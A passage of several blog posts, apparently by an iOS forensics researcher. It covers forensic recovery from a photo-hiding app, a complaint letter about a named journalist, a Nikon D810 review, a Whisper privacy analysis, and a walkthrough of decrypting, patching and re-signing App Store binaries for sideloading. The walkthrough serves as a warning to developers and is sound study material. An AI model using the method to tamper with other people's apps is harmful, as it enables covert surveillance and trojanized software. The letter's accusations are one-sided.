I've consulted on a few different criminal cases where this application was used by a suspect to hide content. Using the methods stated above, it's trivial for any capable law enforcement forensics software to recover these images (unencrypted) from a device, if the device is unlocked, or if the suspect gives their PIN, or if the suspect's desktop machine is seized and a pair record or backup is recovered. Keep in mind that, since forensics software can do it, this also means any decent criminal hacker worth his salt can do it as well. If you are trusting your private images to this application, you are potentially at risk.

Note that this application has stored files in this fashion for years. I thought I'd re-download it and see if they've changed anything, but apparently this is not the case. It took all of five minutes to perform a forensic recovery of the data inside this app container on a locked phone using a pair record from a "seized" desktop. It can also be dumped easily from an unlocked device, or a device that I've watched you type your PIN into, etc. The application, in my opinion, offers no practical protection or technical means of privacy beyond any other file on your iPhone.

This is just one of many examples of security applications in the App Store that do not appear to do what they advertise, or at least do it in any meaningful and secure fashion. Until Apple performs any kind of testing of apps such as this (and removes those that do not provide the protection they claim), you'll need to be very careful what applications you choose to trust your content to.

  


Below is a letter I've sent to Royal Media today regarding a journalist who has gone far beyond his ethical and professional boundaries to harass and attack me. Why you ask? Because I didn't think a particular subject I was researching was credible enough yet to warrant a story. I wanted to bring this to the attention of the tech community as a lesson to be very careful about which journalists you choose to speak with. When you have new findings to share, the choice of which journalists you discuss them with can be harmful if you choose unethical or unprofessional reporters, who are not willing or able to come to an understanding of the details surrounding your work.

Unfortunately, this is not the first time I have had to deal with less than ethical journalists. If you recall, I've recently had to deal with [a smear campaign from a ZDNet writer](http://www.zdziarski.com/blog/?p=3609), who seemingly used her position in journalism to launch a libelous attack against me, motivated by my religious beliefs (or what she thinks they are), with the full support of the ZDNet staff, who never took any action. Sadly, today, any hack can become a "reporter", in today's sense of the word, regardless of what kind of journalism training, or even ethical training, they've had. News agencies rarely hold their own writers accountable, especially in tech, where misogyny / misandry thrive, and where personal attacks generate headlines.

I have a very few select number of journalists that I have built a respect for over time. Some of them are the ones that rarely ever cite me, but get a lot of their information from me, and I respect that - I'm not a media whore by any stretch. Because of the rampant lack of ethics and professionalism in journalism, I have - on many occasions - turned down both print and media interviews (many even on national news shows) simply because I do not know the journalists reaching out to me. How a journalist chooses to portray you and your research is often a matter of their perspective, rather than the facts. Their perspective, of course, is driven by their professional dedication to ethics and the truth. Qualities like that are hard to determine until you've seen a few stories go through a reporter's mind.

My point is, be careful about who you trust.

_Mr. Hornblass, Ms. Thomas,_

_I'd like to bring to your attention some recent abuse, harassment, and public slander I have received this morning from one of your reporters (Ian Kar). Here is a brief summary of events:_

_I am a (well-respected) forensics researcher and author who had previously reverse engineered Facebook Messenger (a week or two back), and had cited some references to a mobile payment system in a single tweet I made on Twitter. Mr. Kar emailed me asking for the scoop to write a story about it. I informed Mr. Kar that I did not think my findings were credible enough to warrant a story, and that it was not worthy of his time (I also told a few other reporters the same thing). Apparently, yesterday, Tech Crunch posted a story on this same topic. They had not approached me about it personally, but had apparently sought another source who did some deeper research in addition to mine; they posted what I thought was a highly speculative story on Facebook payments. _

_This morning, Mr. Kar emailed me and proceeded to chew me out about how wrong I was, and proceeded to lecture me on his 22 years of experience, and essentially accuse me of ruining his story. I responded by email, informing him that nobody was going to want to talk to him if he was going to attack his sources. I also blocked Mr. Kar on Twitter. I then posted a tweet explaining that I had just been bitched out via email for not thinking an FB pay story was worthwhile, and chose not to talk to the reporter about it. As I have a number of other security researchers who follow me, it seemed relevant to inform them that some reporters were in fact being abusive to members of our community._

_Mr. Kar then let loose on Twitter, with everything from attempting to justify attacking me to eventually calling me a racist, and ending his rant with a "Fuck Him". I have included screenshots of some of his tweets below for your review. I am completely appalled at such abusive and immature behavior of someone who claims to be a journalist. I do not know if Royal Media has an ethics policy regarding reporters, but if you do, I would think that Mr. Kar behavior has certainly violated it._

_I work very hard in my field to provide very accurate and worthwhile research. When I have findings to share, I typically publish them on my blog, or in a white paper, and speak openly to reporters. I have given many reporters hours upon hours of my time to thoroughly explain a complex topic. If you speak to reporters at the NY Times, Washington Post, Mashable, WIRED, ARS Technica, and others, they will confirm that I have taken significant time to discuss important topics with them, such as my recent "Identifying Backdoors, Attack Points, and Surveillance Mechanisms in iOS Devices" paper, published in the International Journal of Digital Forensics and Incident Response._

_I have always been very careful not to lend to speculation or half-truths that journalists could (ab)use to puff up their headlines, and am very quick to shut down any malformed ideas about technology that could lead to poor journalism. It was within my best judgment (and still is) that the few details we know about FB's payment system are too speculative to be credible for a story. _

_I do not appreciate having a member of your staff attacking me for giving my honest opinion, or declining to discuss a topic I do not feel comfortable discussing. I am thoroughly disgusted that a member of your staff would publicly accuse me of being a racist. This accusation is so absurd, considering that I have never met Mr. Kar, and do not even know what nationality he is! Not that it would matter anyway - as I am not a racist, and never have been, but does go to show just how asinine and judgmental a statement that is. If Mr. Kar is willing to make such ignorant and poor judgments of his own sources, with zero facts, just how poor is his judgment and ethical regard for journalism?_

_I have asked Mr. Kar to please cease all communication with me. I have since received three more emails from him, and seen numerous tweets go by his Tweet stream. This is now bordering on harassment._

_I would appreciate your swift response to this situation. I do not think it is in Royal Media's best interest to have reporters on your payroll who attack their sources so viciously when things don't go their way._

_Please feel free to contact me to discuss this._

_[ contact info and letter closure ]_

NOTE: Since the original tweets were deleted by @iankar_, I have uploaded some screenshots, including the apology he did eventually give, which came shortly after contacting his editor, [here](http://imgur.com/a/EO2jc).

**A Code of Ethics**

In the future, if new agencies want to earn their sources' trust, they should post a public code of ethics, which should also have a commitment to and a process for dealing with ethics violations. At the very least, this would show researchers who's serious about ethics and who's not. A public, written code of ethics and commitment to journalistic integrity is virtually nonexistent for many news agencies. To put the burden of vetting and policing journalists on the sources is extremely unreasonable, and news agencies really need to step up on controlling this kind of behavior.

Other things news agencies can do would be to better vet their journalists with personality profiles, and to ensure that they use only agency email and social accounts to correspond with sources. I get more journalist email from gmail right now, meaning that there is no accountability (in the form of an email archive) when issues arise. Using agency accounts might at least help restrain this kind of behavior.

**Tips for Evaluating Journalists**

How a journalist approaches you is also a great indicator about what kind of journalist they're going to be. If they approach you asking for a better understanding of what you're talking about, for a "possible" story, then that's a good sign that they are interested in the factual content of your research. If they approach you asking for a quote for their story, or tell you that they're writing a story about your research and would like to "interview" you, then this suggests they may have already jumped the gun and be looking for nothing more than headlines to make. After all, a good journalist wants to make sure that they actually have a good story before proceeding. If your research is the story, then it should send up red flags if they've already made up their mind to write about it without talking to you first.

Another way to tell a good journalist is to tell them you'd like a chance to review the story, to double check it for factual errors, prior to publishing it. If they decline, or claim that their news agency has rules against this, then you're possibly dealing with a journalist who doesn't care about the facts, and possibly is even trying to blame his/her news agency for it. If you were to email the senior editor of any reputable news agency and ask if they want their reporters to double check facts before publishing, you'd be hard pressed to find one that wouldn't be OK with this practice.

When discussing details with a journalist, the good ones tend to echo what you told them back to you, in their own words, to ensure that they understand what you're talking about. The less credible journalists tend to echo your own words back to you, to make sure they got the quote right. This can be a good litmus test to find out if a journalist is interested in _understanding_ what you are saying, or only interested in publishing it in his/her story.

There are a couple of really good reporters who call me back frequently (sometimes annoyingly) to clarify a few points. This is a good sign. It means they care about their story enough to want to get it right. If they call you hounding you for quotes, or asking you, "what do you think of this" or that, then that's different; that, on the other hand, is a sign that they're ambulance chasing.

If it turns out that a journalist publishes an online article that has some inaccurate content - call or email them and bring it to their attention. I've found some great reporters who will go back in and edit the article before it's reached critical mass on the website. If they tell you that they can't go back and edit it (and it's still early on), then they either don't care enough about their article, or their news agency doesn't care enough about post to give their journalists the right tools. Everybody makes mistakes, but to be unable or unwilling to fix them is suspicious.

Lastly, of course, if someone publishes a story that quotes you, such as a tweet or a website quote, but never actually approaches you about it prior to publishing - cross them off your list. Anyone who isn't interested enough in putting your words in context isn't worth their salt as a journalist. Anyone who is already writing an entire story based on a tweet is not a journalist. The good ones may reach out to you and ask if there's something worth looking deeper into. The "where there's smoke, there's fire" schtick doesn't hold water, especially in tech. One minor subroutine, or one little detail can derail months of security research. It happens to even the best.

A good journalist seeks knowledge. A poor one seeks a story. Seek out the good ones, and you'll avoid a lot of headache down the road. Until society starts holding journalism to a higher standard again, unfortunately you're going to have to pick and choose who is going to screw a story up, and try to avoid being in the middle of it.

  


I recently upgraded my D800 to a D810, with my other camera being a D800E. I am thoroughly satisfied with my decision, not only because of the improvement in image quality from not having an OLP filter, but also for a number of other reasons, that are also leading me to consider upgrading my D800E as well. There are a lot of obvious new features that you can read about on other sites, but it's the small details that have gone unnoticed that I am particularly thrilled about.

Getting the big things out of the way first, the biggest for me is frame rate. The D810 delivers 6 fps in 1.2x crop mode. This is huge, as it basically turns the D810 into the equivalent of a Canon 5D MK III for action photography, but lets you dial back into a full frame resolution of 36 MP for studio and portrait. At 1.2x crop, you're getting roughly 24 MP, which is still more than the 5D's 22.5 MP, but with the same 6 fps frame rate. The D800/D800E can only shoot 5 fps at this resolution, and if you've ever done it, you realize that there's a huge difference between 5 and 6. Additionally, with the MDB-12 grip and either AA or EN-EL18 batteries, you can boost that up to 7 fps shooting in DX mode, with a very respectable 15 MP. While it's not as fast as the D4s, 7 fps is still fast enough for most of us - unless you work for SI. I shoot a lot of my kids' games when they play sports, and I also like to shoot wildlife once in a while. The D810 is fast enough to make me feel confident.

_NOTE: I tested with the EN-EL15 battery in the MD-B12 grip, and you cannot get 7 fps out of it, probably due to power constraints. You must use either the AA or the EN-EL18 batteries._

Along with the improved frame rate, you also get faster auto-focus as well as group AF, which is fantastic. In addition to the group AF, you also get the option to turn on/off face detection. This is awesome, because if you have face detection on, but you're shooting a person through an obstruction - such as a tree branch - the camera will automatically focus on the face, rather than the branch. You can also set up the camera to expose for a person's face, when detected, so you don't blow the highlights out. This is great for concerts or outdoor sports, where your camera's metering isn't always the best.

Speaking of metering, another big feature I love is the highlight weighted metering. If you're shooting a scene that has a bright spot - such as the moon - the camera will take the edge off of the exposure so that it doesn't blow out the highlights. I took a couple of shots of night scenes (with a full moon), and the detail in the moon when using highlight weighted metering was noticeably better. Most people tend to blow out the moon and end up with a small white blob in the sky, which they photoshop out later. Highlight weighted metering is also great for outdoors, Christmas lights, or other places where you have some bright spots in the photo.

So you've probably read all of that (and more) on a number of other pages, too. Here's what has gone virtually unmentioned by review sites, that you'll love as a photographer. These are the tiny little details that you only really get to know if you shoot Nikon on a regular basis:

  * The bracketing has been updated to allow you to go beyond a +/- 1 EV, you can now go as high as +/- 3 EV, allowing you to reasonably bracket a full sunset scene in only two or three shots. There's usually a two or three EV difference between the sky and whatever's under the horizon line in your photos; most ND-Grad filters are set up with +/- 2 or 3 EV to give you an even exposure in this fashion. Before, with the D800 and D800E, I had to use at the very _minimum_ a 5 shot bracket (at +/- 1 EV) in order to capture the whole scene for an HDR, and often a 7 shot bracket. With the dynamic range of these cameras, I feel comfortable fitting a scene into a 3-shot bracket now, at +/- 2 or 3 EV, depending on the scene. This can save an incredible amount of time, especially if you're doing long exposures.
  * The timer function has been upgraded so that you no longer need to do the "2 shot trick" to get your bracket to fire. You can leave the "No. of Shots" setting at 1, and if you have a bracket program, the entire program will still run. This has always been an annoyance for me, when switching between HDR photography and single shot, because I either had to change this setting constantly, or have to deal with two shots being taken when I only needed one. If you're doing a long exposure, this can be especially painful.
  * The D810 has the same new feature that just got pushed as a firmware upgrade to D800 and D800E, f13 "Assign movie record button", which allows you to set the function of the record button when in camera mode. I use this to set the ISO when on full manual, and when in action mode, I use it to set the crop mode, which lets me switch between 5, 6, and 7 fps, depending on my needs for frame rate vs. resolution.
  * In Mup mode, the digital readout displays a rotating marquee to let you know that the shot is exposing (at least it does this with electronic front-curtain). This is great during long exposures, especially given how quiet the shutter is. I wish they did this for all modes.
  * The rear display now tells you what your frame rate is
  * The BKT button has been moved to the front of the camera, which I initially didn't like, except now there is a metering selector where it used to be… I initially took this for granted, until I realized what a pain it used to be to turn the meter selector switch, especially with gloves on.
  * The Fn button can now (finally) be assigned to bring up My Menu, instead of just the top item on it.
  * A new option a12 (Autofocus mode restrictions) allows you to set specific focus modes (AF-C / AF-S) for certain memory banks. This can really help you to avoid accidental mishaps. For example, if you were shooting landscapes on Tuesday in AF-S, then went to shoot your son's soccer game on Wednesday, you might forget to change it to AF-C. If you create a memory bank specifically for action shooting, though, you can restrict it to AF-C only, to avoid this.
  * You can finally set up the camera to allow you to scroll through pictures in playback mode using the dials!

So what does Nikon need to add to the D810 that's missing? The only things I can think of are:

- To apply electronic first curtain (EFC) to timer mode, instead of reserving it just for Mup mode. There's no reason I shouldn't be able to use EFC while shooting on timer. Perhaps Nikon thought it unnecessary, but if you're shooting a bracket program (to later convert to an HDR), using Mup is just plain inefficient. While I haven't noticed any significant difference in quality between timer vs. EFC, it would be nice to use both. Fortunately, this is something Nikon could fix in a firmware upgrade. Unfortunately, Nikon is not really known for adding "features" to their firmware upgrades; otherwise, we'd have a number of these new features on the D800/D800E.

- The D810 still lacks a U1/U2 preset mode. Nikon has always stubbornly insisted this is a consumer grade feature, yet their data banks are still crippled in ways that make it very inconvenient. Preset modes store a lot of information that the banks don't. I would love a way to store my metering mode, AF Area, current AF selection, and other data so that it all snaps back. Preset modes on other Nikon cameras can also be set up to default to saved settings every time the camera is powered off; with storage banks, your last used settings are always recalled, making it difficult to know if your camera is zeroed for every shoot.

- As mentioned above, Nikon really needs to come up with a way to store meter mode in a data bank. For landscape, I typically use matrix metering. For portraits, I use center weighted. Being able to recall these with my banks would ensure I'm metering properly for my subject type without having to think about it.

  


(**And Why Self-Expiring Messaging Apps Aren't Trustworthy**)

This brief post will show you how hackers are able to download an App Store application, patch the binary, and upload it to a non-jailbroken device using its original App ID, without the device being aware that anything is amiss - this can be done with a $99 developer certificate from Apple and [optionally] an $89 disassembler. Also, with a $299 enterprise enrollment, a modified application can be loaded onto any iOS device, without first registering its UDID (great for black bag jobs and the intelligence community).

Now, it's been known for quite sometime in the iPhone development community that you can sign application binaries using your own dev certificate. Nobody's taken the time to write up exactly how people are doing this, so I thought I would explain it. This isn't considered a security vulnerability, although it could certainly be used to load a malicious copycat application onto someone's iPhone (with physical access). This is more a byproduct of developer signing rights on a device, after it's been enabled with a custom developer profile. What this should be is a lesson to developers (such as Snapchat, and others who rely on client-side logic) that the client application cannot be trusted for critical program logic. What does this mean for non-technical readers? In plain English, it means that Snapchat, as well as any other self-expiring messaging app in the App Store, can be hacked (by the recipient) to not expire the photos and messages you send them. This should be a no-brainer, but it seems there is a lot of confusion about this, hence the technical explanation.

As a developer, putting your access control on the client side is taboo. Most developers understand that applications can be "hacked" on jailbroken devices to manipulate the program, but very few realize it can be done on non-jailbroken devices too. There are numerous jailbreak tweaks for unlimited skips in Pandora, to prevent Snapchat messages from expiring, and even to add favorites in your mentions on TweetBot. The ability to hack applications is why (the good) applications do it all server-side. Certain types of apps, however, are designed in such a way that they depend on client logic to enforce access controls. Take Snapchat, for example, whose expiring messages _require_ that the client make photos inaccessible after a certain period of time. These types of applications put the end-user at risk in the sense that they are more likely to send compromising content to a party that they don't necessarily trust - thinking, at least, that the message _has to_ expire.

Apple's hedged garden approach has given both end-users, and developers too, the [false] sense of security that their applications aren't susceptible to being "hacked" as long as you don't jailbreak. As a result, many developers have incorporated counter-jailbreaking techniques into their apps (which also can be hacked), but they assume that if the device is not jailbroken, it can be trusted. Other developers don't even go that far, and just assume that their application will always behave the way they've designed it - this is often a byproduct of having very little reverse engineering experience. Here's a brief explanation of how hackers are using Apple's developer program to manipulate applications on trusted platforms. Again, this is nothing new, but I thought it would be a good idea to document it.

**Step 1: Decrypting the Application**

Before an application can be modified, it must first be decrypted; this is because Apple uses a form of DRM similar to FairPlay on applications. The decryption can be done by hand (the methods, I've outlined in my book, _Hacking and Securing iOS Applications_), or made simple with a number of free tools. While a hacked app can be loaded onto a non-jailbroken device, you'll need to first use a jailbroken device to decrypt the app - this can be any device, and doesn't need to have any personal data on it. The most popular tool for the job, used largely in the software piracy scene (although has many legitimate research uses) is [Clutch: High Speed iOS Decryption System](https://github.com/KJCracks/Clutch).

With one command, Clutch can decrypt and repackage the application as an .ipa (zip) file, which can then be copied over to a desktop machine for patching. When an application is decrypted, it is loaded into memory, and then attached to with a debugger before it's run. The operating system has to decrypt it before it can run, and so by setting a breakpoint, then dumping the memory at the program's start address, you can get a complete decrypted dump of the executable code. The encrypted part of the file is then overwritten in-place with the decrypted copy, and a _cryptid_ field is unset. From here, it's smooth sailing.

![Screen Shot 2014-10-10 at 1.42.01 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-10-at-1.42.01-PM-1024x790.png)

> _Step 2: Patch the binary to alter behavior_

After transferring the decrypted .ipa file back over to the desktop, it can be unzipped, and the application can be found in its Payload directory. Depending on the kind of functionality the attacker is looking for, the binary can then be patched to change its behavior. In the case of Snapchat (and other applications that claim self-expiring messages), the application's timer can be fudged with to prevent any messages from ever expiring. This is the same with virtually every other self-expiring messaging program out there. Even the well respected ones _must_ have code to expire the messages on the client side; it's just a matter of finding and patching it.

Patching can be done with an open source disassembler, although the process is made much easier with tools like [Hopper](http://www.hopperapp.com), which is well worth the $89. Lets take the Twitter application, for example. Hate those pesky ads? An attacker could easily modify the binary to simply NOP certain checks, and disable them. Here's one example, which overrides checks in a function named _TNFDisallowPromotedContent_, that disables ads for Twitter employees (I guess they don't eat that part of their own dog food). All those nop commands between 0x004bd7aa and 0x004bd7b8 overwrite logic checks that would turn ads on for all non-employees of Twitter. Perhaps if Twitter employees were forced to look at their own ads, they might realize how annoying they are, and also how poor their analytics are.

![Screen Shot 2014-10-02 at 4.21.51 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-02-at-4.21.51-PM-1024x685.png)

> _[Screen Shot 2014-10-02 at 4.21.51 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-02-at-4.21.51-PM.png)_

**Step 3: Sign the Binary With Developer Credentials and Repackage**

Once the binary has been modified, the original signature on it will become invalid. This is where having a $99 developer program enrollment comes into play for an attacker. The target iPhone doesn't know the difference between the original developer's certificate or yours, and so it can simply be re-signed using Apple's _codesign_ utility.

![Screen Shot 2014-10-10 at 1.50.48 PM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-10-at-1.50.48-PM-1024x790.png)

> _Once signed, the entire directory structure can be zipped back up and renamed .ipa._

**Step 4: Copy Provisioning Profile and Application with Xcode**

Using Xcode, the target device is loaded with the attacker's provisioning profile which has registered the UDID of the device - unless they are part of Apple's enterprise developer program. Enterprise developers (those who paid $299) get to load their applications on any iOS device without having to register the UDID first. The application can then simply be dragged onto the phone from Xcode's organizer window, and it will pop up on the target phone. It will look and function just like the original application on the phone, and the user will be none the wiser. In fact, the App Store application will even check for updates to the software, believing the official app is installed (unless an attacker changes the identifier). My patched Twitter app works fine with push notifications and all other features, but suppresses all advertising.

**Implications**

The ability to override program logic can allow for a number of potential risks that developers need to be aware of. This type of attack could be used to prevent incoming photos or messages from ever expiring, or allow a screenshot to be used, etc. Going beyond Snapchat style apps, attacks against payment processing apps, banking apps, or even mobile device apps could all potentially be performed to attempt to access data that the end user shouldn't otherwise have access to.

Consider this (real world) vulnerability that existed at one time: a certain payment processing application that kept a log of transactions on the client, and relied on client logic to limit the refund amount to not exceed the purchase amount. This vulnerability allowed an attacker to steal a merchant's iOS device, patch the binary to let them charge themselves $1, then refund themselves $100,000, which drafted automatically from the merchant's account. Such programming errors could potentially leave a small business bankrupt if gone unnoticed (and done more subtly).

Other more far fetched, but plausible attacks might include adding subroutines into code that would copy a user's credentials or other personal data and send it to a remote server, as the user used their application. Such an attack would require physical access to the device, as well as the PIN, but are possible. The user would think they're using the same app they always use, but this technique would be used to introduce a trojan into it. For example, consider a CEO or diplomat targeted by some government; were their mobile device seized at an airport for a certain period of time, a patched copy of some secure messaging app could be loaded onto the device, replacing the existing one. Of course, none of this is easy to pull off, and requires physical access… but you get the idea.

**Solution**

The current way that applications are designed to install and run in iOS (including 8) allow for modified binaries to be signed by any developer. It's a difficult problem to address, and Apple could potentially do more to mitigate the risk; but this would require a redesign, though, and possibly would not be a complete solution. Some type of trusted computing involving the secure enclave is likely going to be necessary, in addition to good design.

The first step in mitigating risk would be for Apple to implement codesign pinning, where certain app identifiers would be added to developer certs, and enforced by the OS. This, for example, would prevent anyone from using the bundle identifier com.facebook.* except for Facebook, who would have the bundle signed into their certs. This prevents identifier reuse but a bigger problem remains: how can applications (and servers they talk to) ensure that they're talking to legitimate copies of applications remotely? For example, ensuring two Snapchat apps talking are really legit?

One idea, sent to me from Matthew Green, is for the OS to be able to inform the application somehow that it's running under a distribution signature (that checks out with Apple's App Store), in the form of a signed token generated in the secure element. This token can then be sent to peers for validation. For example: Alice wants to sent Bob a picture. Alice initiates a request to authenticate Bob's application. Bob's application talks to iOS via a framework, which examines the application's signature and verifies it's a valid App Store distribution signature. It then signs a token and provides that back to the application, which gets sent to Alice's device. Alice's device must have a mechanism to authenticate that token in her own device's secure element, then can tell the application to go forward with the transfer. If the authentication fails, Alice's phone refuses to send the photo.

Another idea I had, which I think is similar to Matthew's, is to supply developers with some extensions to the existing common crypto framework, where developers can marry a session key to a special key inside the secure enclave, through some form of key derivation function. This derived key will only be valid if the calling application can be verified by the OS as having a valid distribution signature. This way, the server can depend on encryption succeeding only if it has gone through the secure element, and subsequently from a trusted (verified) application. Somehow the server side will need to coordinate this, possibly through seeding via the Apple-issued distribution certificates.

These ideas may mitigate binary patches but you'd still have to contend with runtime abuse on Jailbroken phones. For this, Apple needs to perform proper jailbreak detection from within the secure element.

**Conclusion**

This issue isn't going to go away any time soon, and desktop machines and other operating systems are even more susceptible to running modified binaries (this is how malware / trojans often work). Developers simply need to be aware that these technical capabilities are possible, and stop trusting Apple's "hedged garden" and "sandbox" to protect all of their application logic. Execution space on client machines has never been considered secure, and never should. Unfortunately, it seems that developers are starting to slip in their secure programming practices.

The moral of the story for developers is simply this: don't trust end users, and that includes your code running on their devices.

The moral of the story for end users is: don't trust developers, and refrain from sending content to people whom you don't trust.

As is the case with any third party application in the App Store, they can be hacked. Whether it's self-expiring photos or other data, anything you send is at the mercy of the recipient.

You might also want to read [What You Need to Know About WireLurker](http://www.zdziarski.com/blog/?p=4140), which explains how malware has used this technique in conjunction with a hijacked pair record to install decoy apps on iPhones. The real vulnerability in this case was the Trojan in pirated Chinese software, however this technique combined with the Trojan and a little social engineering made for an interesting attack.

  
![Screen Shot 2014-10-16 at 11.44.05 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-16-at-11.44.05-AM-150x150.png)

> _Screen Shot 2014-10-16 at 11.44.05 AM_

Interested in the low level statistics of your iOS device's disk, such as inode consumption and other file system metrics? Disk Analyzer allows you to view and work with your device's used and free space and partition statistics. This simple little tool provides all the information about your device's disk in simple, user friendly display. An ideal tool for businesses and enterprises.

In addition to analyzing your disk space, Disk Analyzer provides an advanced tool that can overwrite the free space on your device. Turn on _Advanced Options_ in Settings to activate this feature, and a "Zero Free Space" button will appear in the application.

Now Available! [Click Here to view in iTunes](https://itunes.apple.com/us/app/disk-analyzer/id922951399?ls=1&mt=8)

  


At the suggestion of @kashhill, I did a brief analysis of the Whisper iOS application, which appears to be at [the height of controversy](http://www.theguardian.com/world/2014/oct/16/-sp-revealed-whisper-app-tracking-users) with respect to user privacy. My preliminary observations follow. Note, I am only looking at the technical aspects of the application, and make no political conclusions about the motivations of the company. I do not see any horribly underhanded malicious code in the application, although it is a large application and my analysis was brief. In spite of this, the Whisper app does not appear to be a social networking application with analytics; it appears to be an analytics and user acquisition application that also happens to have a social networking component. With this come a few concerns about privacy and anonymity.

**Fiksu Platform**

The core platform this application appears to be designed on is Fiksu (http://www.fiksu.com). Fiksu's describes themselves as a "user acquisition" company, focused on analytics, social tracking, advertising, incent, and interest mining. Per their "Social" product, their capabilities include "proprietary interest mining to identify new and non-obvious correlations of interest". Unlike most applications that incorporate analytics packages as a secondary module, it appears that Whisper is built on top of the Fiksu platform, where Fiksu acts as the primary application delegate, and the social networking element of Whisper acts as secondary to the application's subject tracking and analytics core.

**Basic Analytics**

The application incorporates pieces of various analytics packages, including those from Fiksu, Facebook, and some proprietary logging. As a result, it is likely possible that all activity within the application can be collected, including user taps, application activity time, hours of use, and even potentially unsent content typed in by the user. I have not made any attempt to specifically identify what analytics are active in the app; I am speaking of the capabilities of most analytics packages in general. Nailing down the analytics was not within the scope of this analysis.

**Unique User IDs**

The application generates unique identifiers the first time it is run, without any initial user interaction. It is speculated that these are used for blocking abusive users, push notifications, and other services, however it is entirely at Whisper's discretion whether or not they are used for subject tracking on the server-side. These unique identifiers specifically identify the installation of Whisper on a given device. While traditional IP address based tracking provides plausible deniability only to the network endpoint, these unique identifiers provide positive identification of the device that, given fingerprint and/or passcode authentication, can also serve as positive identification of an individual, eliminating any plausible deniability of the user's identity. These user identifiers appear to exist for the life of the application, and are assigned even if the user wishes to remain anonymous while using the application.

While the unique identifier generated appears to have some correlation to the user's advertising identifier in some cases, resetting the advertising identifier in iOS does not cause any of the identifiers stored by Whisper to change. It should therefore be considered a permanent unique id. In fact, even by uninstalling the application and changing the advertising identifier, Whisper does not appear to change the unique identifier assigned to the user.

Below is a screenshot showing the unique identifiers generated after the app is run for the very first time, prior to any user interaction.

![Screen Shot 2014-10-17 at 9.55.08 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-9.55.08-AM-1024x717.png)

> _Encoding User Identifier into Exif Tags for Uploaded Images_

The application appears to have a mechanism to encode one of the unique identifiers (puid, which may be a push uid) of the user into the exif data of an image before it is uploaded to the server. A string containing the puid and a tag are hashed into an md5, which gets added to the exif. Fortunately, this mechanism does not allow the identifier to be extracted, but if the identifier is already known, can be used to confirm that the image belongs to the user in question. This could potentially be used by both Whisper themselves on the server-side, as well as during forensic examinations to correlate a specific installation of the application on a device with uploaded images. It would be trivial to, at the server end, iterate through saved puids for every user to eventually produce a matching hash.

![Screen Shot 2014-10-17 at 11.38.21 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-11.38.21-AM-1024x181.png)

> _Exif Tags Potentially Sent on Feedback_

When using the application's feedback mechanism, a button exists to attach images. Unlike other image handling code in the app, which processes images without any exif data, the way in which images are processed when sending feedback is different. Here, they are handled in such a way that the exif tags could potentially be preserved in the copy sent to the server. In such cases, geotagged photos could potentially leak specific location information from the location they were taken. Users should be aware of this, and avoid sending any photos that may include location data.

**Active and Passive Location Tracking**

As the iOS operating system enforces access to geolocation tracking, the user must consent to give Whisper access before location can be tracked. Once permission is given, two different modes of location tracking are enabled at different points in the application. "Active" tracking occurs when the user actively looks for nearby whispers. "Passive" tracking, on the other hand, is engaged in the background without the user's direct interaction, and can be triggered a few different ways. The primary trigger for passive tracking appears to be associated with viewing groups.

GPS positioning is intentionally canceled whenever the application is suspended into the background.

In spite of Whisper's claims that location data is "fuzzed", "salted", or in some way cleansed to a large radius, the application requests a level of accuracy from Apple's CoreLocation manager of no worse than 100 meters, as shown below by the Apple constant kCLLocationAccuracyHundredMeters. Other constants available from Apple include 1km and 3km radii, however these larger constraints were not used by the Whisper app. While using any constant could potentially result in more granular accuracy than requested, using kCLLocationAccuracyHundredMeters causes the iOS device to spend more time and battery power acquiring a more specific location.

![Screen Shot 2014-10-17 at 9.53.22 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-9.53.22-AM-1024x759.png)

> _[Screen Shot 2014-10-17 at 9.53.22 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-9.53.22-AM.png)_

As a result of the 100m level of detail requested by Whisper, CoreLocation will return results within this smaller radius of 100 meters, and often less. In the example below, the location returned is demonstrated to be within a radius of 65 meters of the subject, returning a significant digit precision.

![Screen Shot 2014-10-17 at 9.52.56 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-9.52.56-AM-1024x728.png)

> _[Screen Shot 2014-10-17 at 9.52.56 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-9.52.56-AM.png)_

Once the Whisper application has acquired the subject's lat/lon coordinates, they are sent to the server _without_ any additional data cleansing to filter the location to a wider radius. While a single line of Objective-C code could easily round the subject's lat/lon down to a much larger (city-wide) radius, there are no signs of the Whisper application attempting to sanitize / anonymize these coordinates prior to sending to the server. With a few more lines of code, a lookup to a third party service such as GeoNames or Google Maps (with a trimmed lat/lon) could return just a city name or zip code that could be sent to Whisper servers, instead of any GPS data.

![Screen Shot 2014-10-17 at 11.18.13 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-11.18.13-AM-564x1024.png)

> _[Screen Shot 2014-10-17 at 11.18.13 AM](http://www.zdziarski.com/blog/wp-content/uploads/2014/10/Screen-Shot-2014-10-17-at-11.18.13-AM.png)_

Chad DePue, CTO of Whisper, later confirmed in a tweet to me that the Whisper app is not filtering/salting the GPS data, citing that it is done server side (after the data has already been received across the network).

It is important to note here that there is no way to verify, without Whisper opening their internal systems to independent audit, as to whether or not the GPS data is actually being cleansed server-side, however given how trivial it would be to cleanse this data within the application, it would make much more sense for privacy's sake to simply fix this in future versions of the app.

**Implications**

